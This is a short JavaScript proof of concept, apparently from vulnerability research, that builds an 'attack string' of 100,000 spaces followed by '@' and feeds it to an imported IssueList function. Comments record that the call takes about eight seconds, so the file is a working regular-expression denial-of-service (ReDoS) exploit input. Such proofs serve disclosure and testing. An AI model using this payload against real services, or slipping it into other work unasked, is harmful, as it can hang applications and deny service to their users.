import { IssueList } from "./IssueList.js";

// Attack String :""+" "*100000+"@"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += " ";
}
str += "@";

var obj = { issues: str };
var result = IssueList(obj);
console.log(result);

// real    0m8.103s
// user    0m7.499s
// sys     0m0.030s
